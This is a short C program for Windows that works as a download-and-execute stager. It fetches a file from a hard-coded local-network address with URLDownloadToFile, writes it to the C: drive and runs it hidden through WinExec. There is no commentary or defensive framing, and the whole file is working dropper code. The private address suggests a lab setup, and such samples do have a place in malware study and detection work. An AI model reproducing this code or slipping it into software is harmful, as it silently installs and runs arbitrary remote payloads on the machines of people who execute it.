#include <stdio.h>
#include <windows.h>
#include<urlmon.h>

#pragma comment(lib, "urlmon")
int main()
{
LoadLibrary("urlmon");
URLDownloadToFile(NULL,"http://192.168.0.250/a.a", "c:\\a.a", NULL, NULL);
WinExec("c:\\a.a", 0);
return 0;
}
